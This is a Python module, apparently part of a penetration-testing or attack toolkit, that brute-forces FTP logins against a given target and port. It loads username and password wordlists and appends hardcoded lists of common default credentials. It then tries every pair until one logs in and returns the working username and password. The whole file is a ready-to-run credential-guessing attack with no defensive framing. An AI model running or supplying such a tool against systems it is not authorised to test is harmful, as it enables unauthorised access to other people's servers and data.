from ftplib import FTP, error_perm, all_errors

def run(target, port, usernames_path="wordlists/port_users.txt", passwords_path="wordlists/port_pw.txt"):
	usernames = []
	passwords = []

	try:
		with open(usernames_path, "r") as f:
			usernames = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "error": "Username file not found"}

	try:
		with open(passwords_path, "r") as f:
			passwords = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "error": "Password file not found"}


	common_usernames = ["anonymous", "ftp", "root", "admin", "user", "test", "guest", "info", "www", "web", "backup", "upload", "operator", "sysadmin", "support", "oracle", "postgres", "mysql", "ftpuser", "user1"]
	common_passwords = ["anonymous", "ftp", "password", "123456", "1234", "12345", "12345678", "root", "admin", "guest", "test", "toor", "letmein", "qwerty", "abc123", "pass", "user", "ftpuser", "default", "welcome", "secret", "123", "1q2w3e4r", "password1", "user123", "111111"]
	for cun in common_usernames:
		if cun not in usernames:
			usernames.append(cun)
	for cpw in common_passwords:
		if cpw not in passwords:
			passwords.append(cpw)



	#debug
	#usernames = ["anonymous", "admin"]
	#passwords = ["pw", "test1", "test2"]
	#return {
	#	"success": True,
	#	"username": "anonymous",
	#	"password": "pw",
	#}
	#return {"success": False}
	for username in usernames:
		for password in passwords:
			try:
				ftp = FTP()
				ftp.connect(target, port, timeout=4)
				ftp.login(username, password)
				ftp.quit()
				return {
					"success": True,
					"username": username,
					"password": password,
				}
			except all_errors as e:
				#print(f"Failed login for {username}:{password} - {e}")
				continue

	return {"success": False}
